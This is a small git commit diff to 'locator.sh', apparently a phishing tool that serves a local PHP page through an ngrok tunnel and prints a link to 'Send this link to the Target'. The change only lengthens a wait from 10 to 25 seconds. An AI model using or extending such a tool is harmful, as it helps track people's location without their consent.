544f133dbcdead30fd1019e154917039d3888e4a
sheikhrishad <51270384+hackerrishad@users.noreply.github.com>
2020-04-14 13:07:41 +0600

    Update locator.sh

--- locator.sh
+++ locator.sh
@@ -328,7 +328,7 @@ php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+sleep 25
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
